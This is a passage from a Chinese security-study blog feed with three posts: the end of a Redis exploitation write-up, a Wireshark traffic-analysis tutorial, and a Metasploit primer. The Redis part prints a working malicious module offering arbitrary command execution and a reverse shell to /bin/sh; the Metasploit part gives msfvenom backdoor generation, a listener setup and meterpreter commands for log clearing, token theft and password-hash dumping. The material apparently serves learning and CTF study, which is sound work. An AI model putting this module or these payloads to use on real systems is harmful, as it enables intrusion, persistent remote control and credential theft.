<span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-type">size_t</span> cmd_len;<br>                <span class="hljs-type">size_t</span> size = <span class="hljs-number">1024</span>;<br>                <span class="hljs-type">char</span> *cmd = RedisModule_StringPtrLen(argv[<span class="hljs-number">1</span>], &amp;cmd_len);<br><br>                FILE *fp = popen(cmd, <span class="hljs-string">&quot;r&quot;</span>);<br>                <span class="hljs-type">char</span> *buf, *output;<br>                buf = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br>                output = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br>                <span class="hljs-keyword">while</span> ( fgets(buf, <span class="hljs-keyword">sizeof</span>(buf), fp) != <span class="hljs-number">0</span> ) &#123;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(buf) + <span class="hljs-built_in">strlen</span>(output) &gt;= size) &#123;<br>                                output = <span class="hljs-built_in">realloc</span>(output, size&lt;&lt;<span class="hljs-number">2</span>);<br>                                size &lt;&lt;= <span class="hljs-number">1</span>;<br>                        &#125;<br>                        <span class="hljs-built_in">strcat</span>(output, buf);<br>                &#125;<br>                RedisModuleString *ret = RedisModule_CreateString(ctx, output, <span class="hljs-built_in">strlen</span>(output));<br>                RedisModule_ReplyWithString(ctx, ret);<br>                pclose(fp);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> RedisModule_WrongArity(ctx);<br>        &#125;<br>    <span class="hljs-keyword">return</span> REDISMODULE_OK;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">RevShellCommand</span><span class="hljs-params">(RedisModuleCtx *ctx, RedisModuleString **argv, <span class="hljs-type">int</span> argc)</span> &#123;<br>        <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">3</span>) &#123;<br>                <span class="hljs-type">size_t</span> cmd_len;<br>                <span class="hljs-type">char</span> *ip = RedisModule_StringPtrLen(argv[<span class="hljs-number">1</span>], &amp;cmd_len);<br>                <span class="hljs-type">char</span> *port_s = RedisModule_StringPtrLen(argv[<span class="hljs-number">2</span>], &amp;cmd_len);<br>                <span class="hljs-type">int</span> port = atoi(port_s);<br>                <span class="hljs-type">int</span> s;<br><br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">sa</span>;</span><br>                sa.sin_family = AF_INET;<br>                sa.sin_addr.s_addr = inet_addr(ip);<br>                sa.sin_port = htons(port);<br><br>                s = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>                connect(s, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;sa, <span class="hljs-keyword">sizeof</span>(sa));<br>                dup2(s, <span class="hljs-number">0</span>);<br>                dup2(s, <span class="hljs-number">1</span>);<br>                dup2(s, <span class="hljs-number">2</span>);<br><br>                execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> RedisModule_WrongArity(ctx);<br>        &#125;<br>    <span class="hljs-keyword">return</span> REDISMODULE_OK;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">RedisModule_OnLoad</span><span class="hljs-params">(RedisModuleCtx *ctx, RedisModuleString **argv, <span class="hljs-type">int</span> argc)</span> &#123;<br>    <span class="hljs-keyword">if</span> (RedisModule_Init(ctx,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-number">1</span>,REDISMODULE_APIVER_1)<br>        == REDISMODULE_ERR) <span class="hljs-keyword">return</span> REDISMODULE_ERR;<br><br>    <span class="hljs-keyword">if</span> (RedisModule_CreateCommand(ctx, <span class="hljs-string">&quot;system.exec&quot;</span>,<br>        DoCommand, <span class="hljs-string">&quot;readonly&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>) == REDISMODULE_ERR)<br>        <span class="hljs-keyword">return</span> REDISMODULE_ERR;<br>        <span class="hljs-keyword">if</span> (RedisModule_CreateCommand(ctx, <span class="hljs-string">&quot;system.rev&quot;</span>,<br>        RevShellCommand, <span class="hljs-string">&quot;readonly&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>) == REDISMODULE_ERR)<br>        <span class="hljs-keyword">return</span> REDISMODULE_ERR;<br>    <span class="hljs-keyword">return</span> REDISMODULE_OK;<br>&#125;<br></code></pre></td></tr></table></figure><p>**#include “redismodule.h”**这里就是引入了这个头文件然后实现了其中的API来定义自定义的模块，这个头文件可以从官方仓库源码中找到，里面的内容就不看了，主要来看每个模块是怎么编写的</p><blockquote><p>上面有三个函数RedisModule_OnLoad，RevShellCommand，DoCommand</p><p>RevShellCommand：该函数是 <code>system.rev</code> 命令的实现。当传入的参数个数为3时，它会获取第二个参数作为IP地址，第三个参数作为端口号。然后，它创建一个套接字，并连接到指定的IP地址和端口。接下来，它将标准输入、输出和错误重定向到套接字，并执行 <code>/bin/sh</code>，从而创建一个反向 shell。</p><p>DoCommand：该函数是 <code>system.exec</code> 命令的实现。当传入的参数个数为2时，它会获取第二个参数作为命令字符串，并使用 <code>popen</code> 函数执行该命令，获取命令的输出。然后，它将命令的输出作为字符串回复给客户端。</p><p>RedisModule_OnLoad：该函数是模块加载函数。在这个函数中，模块进行了初始化，并创建了两个命令：<code>system.exec</code> 和 <code>system.rev</code>。这些命令分别与对应的处理函数 <code>DoCommand</code> 和 <code>RevShellCommand</code> 关联起来。这样，当客户端在Redis中执行这些命令时，相应的处理函数将被调用。</p><p>RedisModule_Init：该函数用于创建一个新的Redis命令，以创建system.exec为例，它接受七个参数：<code>ctx</code> 是Redis模块上下文指针，”system.exec” 是命令的名称，<code>DoCommand</code> 是处理该命令的函数指针，”readonly” 是命令的标识符，1 是命令的键和参数的个数，1 是命令的名字和参数的个数，1 是命令的复杂度。如果命令创建失败，函数将返回 <code>REDISMODULE_ERR</code>。</p></blockquote><h1 id="安全防护"><a href="#安全防护" class="headerlink" title="安全防护"></a>安全防护</h1><p>redis的安全设置：设置完毕，需要重新加载配置文件启动redis。</p><ol><li>绑定内网ip</li><li>requirepass设置redis密码</li><li>开启保护模式(protected-mode)</li><li>最好更改一下默认端口</li><li>单独为redis设置一个普通账号，启动redis</li></ol>]]></content>
      
      
      <categories>
          
          <category> web漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流量分析学习</title>
      <link href="/2024/03/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/03/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="Wireshark的基本使用"><a href="#Wireshark的基本使用" class="headerlink" title="Wireshark的基本使用"></a>Wireshark的基本使用</h1><h2 id="基本界面介绍"><a href="#基本界面介绍" class="headerlink" title="基本界面介绍"></a>基本界面介绍</h2><p>点进去就是wireshark的主界面，包含主机上存在的流量文件和用于捕获流量的网卡</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329215038242.png" alt="image-20240329215038242"></p><p><strong>工作界面</strong></p><p>这里选用了以太网网卡捕获了一些流量进行演示</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329215342258.png" alt="image-20240329215342258"></p><p><strong>一些菜单栏</strong></p><ol><li><p>文件菜单</p><p>文件菜单主要负责打开已经抓取的数据包、最近打开的数据包合并数据包、导入导出特定数据包。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329215454613.png" alt="image-20240329215454613"></p></li><li><p>编辑菜单</p><p>编辑菜单主要负责对数据包分类标记，以及在抓包过程中按照时间大小进行分包存储，还有整个软件的首选项也在编辑菜单中。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329215539889.png" alt="image-20240329215539889"></p></li><li><p>捕获菜单</p><p>捕获菜单用于设置捕获规则，其中选项菜单可以设置捕获的网卡，还可以设置捕获规则</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329215720951.png" alt="image-20240329215720951"></p></li><li><p>分析菜单</p><p>分析菜单针对已经获取的数据包进行分析，通过制定相应的规则筛分数据包。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329215812146.png" alt="image-20240329215812146"></p></li><li><p>视图菜单</p><p>视图菜单主要是针对软件中的视图显示进行设置，重点需要关注的是解析名称、列显示中的着色规则。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329215931362.png" alt="image-20240329215931362"></p></li><li><p>统计菜单</p><p>统计菜单可以通过对已有数据进行图形化数据分析，这个功能对于分析大量数据是非常有帮助的。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329220025304.png" alt="image-20240329220025304"></p></li></ol><h2 id="数据包显示相关"><a href="#数据包显示相关" class="headerlink" title="数据包显示相关"></a>数据包显示相关</h2><p><strong>数据包显示列信息</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329220327142.png" alt="image-20240329220327142"></p><ol><li>No：编号，根据抓取的数据包自动分配</li><li>Time：时间，根据捕获时间设定该列</li><li>Source：源地址信息，如果数据包包含源地址信息比如：IP、MAC等，会显示在该列中</li><li>Destination：目的地址信息</li><li>Protocol：协议信息</li><li>Length：数据包长度信息</li><li>Info：wireshark对数据包解读的信息</li></ol><p><strong>修改显示列信息</strong></p><p>我们可以选择想要加入显示列的子项右击并选择应用为列，就可以在上面看到该列</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329220847712.png" alt="image-20240329220847712"></p><p>我们还可以删除已存在的显示列</p><p>我们还可以右击编辑列信息</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329221320578.png" alt="image-20240329221320578"></p><p><strong>修改显示列时间</strong></p><p>默认给出的时间格式不好阅读，我们也可以自己进行修改</p><p>我们可以单击视图选择想要的时间格式</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329221446446.png" alt="image-20240329221446446"></p><p><strong>名字解析</strong></p><p>默认情况下Wireshark只开启了mac地址解析，如果有需要我们可以开启解析网络名称、解析传输层名称。</p><p>点击捕获，在捕获选项中进行修改，比如传输层就会将能识别的端口号解析成对应的服务名称，解析不了就显示原始端口号</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329221847219.png" alt="image-20240329221847219"></p><h2 id="数据包操作"><a href="#数据包操作" class="headerlink" title="数据包操作"></a>数据包操作</h2><p>获取数据包后用户可以对其进行标记、注释、合并、打印以及导出等操作，这里记录一些比较有用的操作</p><ol><li><p>标记数据包</p><p>标记数据包可以实现对比较重要的数据包进行标记，同时还可以修改数据包显示颜色。标记数据包的操作步骤如下:</p><p>在需要标记的数据包右击选择“标记&#x2F;取消标记”</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329222938030.png" alt="image-20240329222938030"></p><p>标记之后数据包就会高亮显示</p></li><li><p>添加注释操作</p><p>Wireshark提供对数据包注释的功能，在实际操作中如果感觉这个数据包有问题或者比较重要，可以添加一段注释信息</p><p>右击需要注释的数据包选择”分组注释”</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329223334679.png" alt="image-20240329223334679"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329223413212.png" alt="image-20240329223413212"></p></li><li><p>打印数据包</p><p>点击文件菜单选择打印</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329224124850.png" alt="image-20240329224124850"></p></li><li><p>合并数据包</p><p>在实际抓包过程中，如果网络流量比较大，不停止抓包操作，可能会出现抓包工具消耗掉所有内存，最终导致系统崩溃的状态。为解决这个问题，用户可以采取分段抓取，生成多个数据包文件，最后为了整体分析，再将这些分段数据包合并成一个包。</p><p>点击文件菜单选择合并，然后选择要合并的流量文件即可</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329223855934.png" alt="image-20240329223855934"></p></li><li><p>导出数据包</p><p>Wireshark提供了数据包导出功能，用户可以进行筛选导出，还可以通过分类导出，还可以只导出选中数据包</p><p>点击文件菜单选择导出特定分组</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329224400060.png" alt="image-20240329224400060"></p><p>还可以选择导出为不同格式</p></li></ol><h2 id="捕获选项"><a href="#捕获选项" class="headerlink" title="捕获选项"></a>捕获选项</h2><p>捕获选项主要针对抓取数据包使用的网卡、抓包前的过滤、抓包大小、抓包时长等进行设置。这个功能在抓包软件中也属于非常重要的一个设置。</p><p><strong>数据包的过滤设置</strong></p><p>Wireshark抓包过滤是基于libpcapWinpcap库实现的，所以遵循BPF(Berke-ley Packet Filter)语法，其中包括类型(Type)、方向(Dir)、协议(Proto)、逻辑运算符。</p><ul><li>类型：host、net、port</li><li>方向：src、dst</li><li>协议：ether、ip、tcp、udp、http、ftp等</li><li>逻辑运算符：&amp;&amp;与、||或、!非</li></ul><p>例如想要抓取源地址为192.168.0.100目的端口为80的流量，过滤语句为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">src host 192.168.0.100 &amp;&amp; dst port 80<br></code></pre></td></tr></table></figure><p>想要抓取ip为192.168.0.100和192.168.0.101的流量，过滤语句为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">host 192.168.0.100 || host 192.168.0.101<br></code></pre></td></tr></table></figure><p>想要抓取除广播外的所有包，过滤语句为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">! broadcast<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329234755443.png" alt="image-20240329234755443"></p><p><strong>常用的过滤器写法</strong></p><ol><li><p>过滤mac地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ether host &lt;需要过滤的MAC地址&gt;<br>ether src host &lt;MAC地址&gt;<br>ether dst host &lt;MAC地址&gt;<br></code></pre></td></tr></table></figure></li><li><p>过滤IP地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">host &lt;需过滤的IP地址&gt;<br>src host&lt;IP地址&gt;<br>dst host&lt;P地址&gt;<br></code></pre></td></tr></table></figure></li><li><p>过滤端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">prot 80<br>! prot 80<br>dst port 80<br>srcport 80<br></code></pre></td></tr></table></figure></li></ol><blockquote><p>抓包过滤一旦设置后将只抓取符合规则的数据包，这样会过滤掉大量干扰数据包，从而提高抓包数据的准确率。</p></blockquote><h2 id="过滤数据包"><a href="#过滤数据包" class="headerlink" title="过滤数据包"></a>过滤数据包</h2><p>过滤数据包时抓取完之后使用显示过滤器来进行过滤，显示出所需要的数据包</p><p><strong>语法规则如下</strong></p><ul><li>比较操作符：&#x3D;&#x3D;等于、!&#x3D;不等于、&gt;大于、&lt;小于、&gt;&#x3D;大于等于、&lt;&#x3D;小于等于。</li><li>逻辑操作：and 与操作、or或操作、xor异或操作、not非操作。</li><li>IP地址：ip.addr、ip.src、ip.dst。</li><li>过滤端口：tcp.port、tcp.srcport、tcp.dstport、tep.flags.syn、 tep.flags.ack。</li><li>过滤协议：arp、ip、icmp、udp、tcp、bootp、dns等</li></ul><p>例如想要过滤指定ip的数据包</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ip.addr==192.168.1.1<br>ip.src==192.168.1.1<br>ip.dst==192.168.1.1<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330000207628.png" alt="image-20240330000207628"></p><blockquote><p>wireshark也会自带补全，类似代码补全提示的那样</p></blockquote><p>更多语法可以参考这篇文章：<a href="https://cloud.tencent.com/developer/article/1442007">https://cloud.tencent.com/developer/article/1442007</a></p><h2 id="数据包分析"><a href="#数据包分析" class="headerlink" title="数据包分析"></a>数据包分析</h2><p><strong>数据追踪</strong></p><p>正常通信中如TCP、UDP、SSL等数据包都是以分片的形发送的，如果在整个数据包中分片查看数据包不便于分析，使用数据流追踪可以将TCP、UDP、SSL等数据流进行重组，以一个完整的形式呈现出来。</p><p>开启追踪流的方式有两种：</p><ol><li>在数据流显示列表中选中要追踪的数据流，右击然后选择追踪流菜单命令。</li><li>选择”分析”菜单，然后选择追踪流。</li></ol><p>比如我这里选择追踪一个http流，他就会显示有关这个这个数据前后相关的整个通信过程</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330002214560.png" alt="image-20240330002214560"></p><blockquote><p>红色是发送请求，服务器返回的结果是蓝色</p></blockquote><p>然后我们还能看到该http请求之前的tcp三次握手的过程</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330002406512.png" alt="image-20240330002406512"></p><p>后面则是传输完成后的四次挥手</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330002541147.png" alt="image-20240330002541147"></p><p>顺便说明这个数据包的具体结构，拿这个http请求为例</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330002653500.png" alt="image-20240330002653500"></p><p>上面从上到下对应着计算机网络中的五层模型：物理层、数据链路层、网络层、传输层、应用层；如果只是tcp协议的话他就只有前四层</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330002805666.png" alt="image-20240330002805666"></p><p><strong>统计数据包</strong></p><p>通过对数据包的统计分析，可以查看更为详细的数据信息，进而分析网络中是否存在安全问题。</p><ol><li><p>选择统计菜单中的”捕获文件属性”，在其中可以查看文件、事件、捕获、接口等信息</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330003100727.png" alt="image-20240330003100727"></p></li><li><p>选择统计菜单中的”协议分级”，可以统计出每一种协议在整个数据包中的占有率</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330003233495.png" alt="image-20240330003233495"></p></li><li><p>选择统计菜单中的”会话”，其中包括以太网、IPv4、IPv6、TCP、UDP等不同协议会话信息展示。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330003457780.png" alt="image-20240330003457780"></p></li><li><p>选择统计菜单中的”端点”，其中包含以太网和各种协议选项。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330003730343.png" alt="image-20240330003730343"></p></li><li><p>选择统计菜单中的”分组长度”，可以对不同大小的数据包进行统计</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330003838451.png" alt="image-20240330003838451"></p></li><li><p>选择统计菜单中的”I&#x2F;O图表”，其中包括一个坐标轴显示的图表，下方可以添加任意的协议，也可以选择协议显示的颜色，还可以调整坐标轴的刻度。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330004032643.png" alt="image-20240330004032643"></p></li><li><p>选择统计菜单中的”流量图”，其中包括通信时间、通信地址、端口以及通信过程中的协议功能</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330004146063.png" alt="image-20240330004146063"></p></li><li><p>选择统计菜单中的”TCP流型图”，在其中可以根据实际需要设置相应的显示，还可以切换数据包的方向。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240330004340761.png" alt="image-20240330004340761"></p></li></ol><h1 id="常见漏洞流量分析"><a href="#常见漏洞流量分析" class="headerlink" title="常见漏洞流量分析"></a>常见漏洞流量分析</h1><p>这里采用dvwa靶场来进行流量分析</p><h2 id="SQL注入流量分析"><a href="#SQL注入流量分析" class="headerlink" title="SQL注入流量分析"></a>SQL注入流量分析</h2>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>msf基础使用学习</title>
      <link href="/2024/03/28/msf%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/03/28/msf%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="msf简介"><a href="#msf简介" class="headerlink" title="msf简介"></a>msf简介</h1><p>Metasploit Framework是一个综合性渗透测试工具，集成信息收集、漏洞扫描、漏洞利用以及提权等功能的工具</p><h1 id="msf目录构成"><a href="#msf目录构成" class="headerlink" title="msf目录构成"></a>msf目录构成</h1><p><strong>msf的目录位置</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/usr/share/metasploit-framework<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328235414919.png" alt="image-20240328235414919"></p><p><strong>msf的各个模块</strong></p><p>MSF有7个模块，分别对下面目录下的7个子文件夹</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">/usr/share/metasploit-framework/modules<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328235616101.png" alt="image-20240328235616101"></p><ol><li><p>auxiliary：负责执行信息收集、扫描、嗅探、指纹识别、口令猜测和Dos攻击等功能的辅助模块</p></li><li><p>encoders：对payload进行加密，躲避AntiVirus检查的模块</p></li><li><p>evasion：这是用于创建免杀木马的模块</p></li><li><p>exploits：利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动）</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329000437236.png" alt="image-20240329000437236"></p><p>这里看一下Windows的一些提权脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/usr/share/metasploit-framework/modules/exploits/windows/local<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329000459473.png" alt="image-20240329000459473"></p><p>可以看到有很多脚本可以使用，后续会进行学习使用。</p></li><li><p>payloads：成功exploit之后，真正在目标系统执行的代码或指令。分为3种类型的payload，分别是single、stages和stagers。shellcode是特殊的payload，用于拿shell。</p><ul><li>single：all-in-one。完整的payload，这些payload都是一体化的，不需要依赖外部的库和包。</li><li>stagers：目标计算机内存有限时，先传输一个较小的payload用于建立连接</li><li>stages：利用stagers建立的连接下载后续payload</li></ul></li><li><p>post：后期渗透模块。在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、跳板攻击等操作</p></li><li><p>nops：提高payload稳定性及维持大小。在渗透攻击构造恶意数据缓冲区时，常常要在真正要执行的Shellcode之前添加一段空指令区， 这样当触发渗透攻击后跳转执行ShellCode时，有一个较大的安全着陆区，从而避免受到内存 地址随机化、返回地址计算偏差等原因造成的ShellCode执行失败，提高渗透攻击的可靠性。</p></li></ol><h1 id="使用msf上线meterpreter"><a href="#使用msf上线meterpreter" class="headerlink" title="使用msf上线meterpreter"></a>使用msf上线meterpreter</h1><p>这里使用Windows7来作为受害机器</p><p><strong>生成一个后门文件用于类似反弹shell</strong></p><p>在MSF中，一般我们生成payload程序后门之类的都是用<code>msfvenom</code>，msfvenom是攻击载荷生成和编码器</p><p>主要参数：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-p payload<br>-e 编码方式,指定编码器，可以实现免杀<br>-i 编码次数。指定编码迭代次数，一般配合免杀使用<br>-b: 去掉坏字符，坏字符会影响payload 正常执行<br>LHOST,LPORT 监听上线的主机IP和端口<br>-f 指定生成格式，如exe 生成EXE格式<br>-o 指定文件名称和导出位置<br>-l 可以查看可以利用payload<br></code></pre></td></tr></table></figure><p>执行下面命令生成一个可执行的后门文件：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_tcp lhost=&lt;攻击机IP&gt; lport=&lt;监听的端口号&gt; -f exe &gt; shell.exe<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329002507164.png" alt="image-20240329002507164"></p><p>然后我们启动msfconsole开启监听</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfconsole<br>use exploit/multi/handler<br>set payload windows/meterpreter/reverse_tcp<br>set lhost &lt;攻击者IP&gt;<br>set lport &lt;监听端口&gt;<br>exploit<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329003229229.png" alt="image-20240329003229229"></p><p>然后把我们刚刚生成的后门文件上传到Windows7上面运行之后就可以获得用户权限，得到meterpreter</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329102808964.png" alt="image-20240329102808964"></p><p>然后就可以输入一些命令进行其他操作了，比如getuid查看一下当前的身份</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329102935408.png" alt="image-20240329102935408"></p><h2 id="一些常用的命令"><a href="#一些常用的命令" class="headerlink" title="一些常用的命令"></a>一些常用的命令</h2><p>直接参考这篇文章copy了过来：<a href="https://www.freebuf.com/articles/web/387662.html">https://www.freebuf.com/articles/web/387662.html</a></p><h2 id="主界面的命令"><a href="#主界面的命令" class="headerlink" title="主界面的命令"></a>主界面的命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">show exploits – 查看所有可用的渗透攻击程序代码<br>show auxiliary – 查看所有可用的辅助攻击工具<br>show options – 查看该模块所有可用选项<br>show payloads – 查看该模块适用的所有载荷代码<br>show targets – 查看该模块适用的攻击目标类型<br>search – 根据关键字搜索某模块<br>info – 显示某模块的详细信息<br>use – 进入使用某渗透攻击模块<br>back – 回退 set/unset – 设置/禁用模块中的某个参数<br>setg/unsetg – 设置/禁用适用于所有模块的全局参数<br>save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用<br>cd 更改当前的工作目录<br>核心命令<br>Sessions 转储会话列表并显示有关会话的信息<br>Color 切换颜色<br>Set 将特定于上下文的变量设置为一个值<br>Connect 连接与主机通信<br>Setg 将全局变量设置为一个值<br>exit 退出控制台<br>sleep 在指定的秒数内不做任何事情<br>get 获取特定于上下文的变量的值<br>spool 将控制台输出写入文件以及屏幕<br>getg 获取全局变量的值<br>threads 线程查看和操作后台线程<br>grep grep 另一个命令的输出<br>unload 卸载框架插件<br>history 显示命令历史<br>unset 取消设置一个或多个特定于上下文的变量<br>irb 进入irb脚本模式<br>unsetg 取消设置一个或多个全局变量<br>load 加载一个框架插件<br>version 显示框架和控制台库版本号<br>quit 退出控制台<br>route 通过会话路由流量<br>save 保存活动的数据存储<br>数据库后端命令<br>analyze 分析有关特定地址或地址范围的数据库信息<br>db_connect 连接到现有数据服务<br>db_disconnect 断开与当前数据服务的连接<br>db_export 导出包含数据库内容的文件<br>db_import 导入扫描结果文件（将自动检测文件类型）<br>db_nmap 执行nmap并自动记录输出<br>db_rebuild_cache 重建数据库存储的模块高速缓存<br>db_remove 删除已保存的数据服务条目<br>db_save 将当前数据服务连接保存为启动时重新连接的默认值<br>db_status 显示当前数据服务状态<br>hosts 列出数据库中的所有主机<br>loot 列出数据库中的所有战利品<br>notes 列出数据库中的所有注释<br>services 列出数据库中的所有服务<br>vulns 列出数据库中的所有漏洞<br>workspace 在数据库工作区之间切换<br>凭据后端命令<br>creds 列出数据库中的所有凭据<br>模块命令<br>Advanced 显示一个或多个模块的高级选项<br>Back 从当前上下文返回<br>Edit 使用首选编辑器编辑当前模块<br>info 显示有关一个或多个模块的信息<br>loadpath 路径从路径搜索并加载模块<br>options 显示全局选项或一个或多个模块<br>popm 将最新的模块从堆栈中弹出并使其处于活动状态<br>previous 将之前加载的模块设置为当前模块<br>pushm 将活动或模块列表推入模块堆栈<br>reload_all 从所有定义的模块路径重新加载所有模块<br>search 搜索模块名称和描述<br>show 显示给定类型的模块或所有模块<br>use 按名称选择模块<br>enumdesktops #查看可用的桌面<br>getdesktop #获取当前meterpreter 关联的桌面<br>setdesktop #设置meterpreter关联的桌面 -h查看帮助<br>screenshot #截屏<br>run vnc #使用vnc远程桌面连接<br></code></pre></td></tr></table></figure><h2 id="拿到Meterepreter后"><a href="#拿到Meterepreter后" class="headerlink" title="拿到Meterepreter后"></a>拿到Meterepreter后</h2><p><strong>系统命令</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">clearav -清除了受害者的计算机上的事件日志<br>drop_token -被盗的令牌<br>execute-执行命令<br>getpid -获取当前进程 ID (PID)<br>getprivs -尽可能获取尽可能多的特权<br>getuid -获取作为运行服务器的用户<br>kill -终止指定 PID 的进程<br>ps -列出正在运行的进程<br>reboot-重新启动受害人的计算机<br>reg -与受害人的注册表进行交互<br>rev2self -在受害者机器上调用 RevertToSelf()<br>shell -在受害者计算机上打开一个shell<br>shutdown-关闭了受害者的计算机<br>steal_token -试图窃取指定的 (PID) 进程的令牌<br>sysinfo -获取有关受害者计算机操作系统和名称等的详细信息<br>sessions -查看当前的会话<br></code></pre></td></tr></table></figure><p><strong>特权升级命令</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">getprivs -尽可能提升权限<br>getsystem -获得系统管理员权限，通过各种攻击向量来提升系统用户权限<br>//不过这两种方式有时候不一定可以<br></code></pre></td></tr></table></figure><p><strong>密码转储命令</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">hashdump -抓取哈希密码 (SAM) 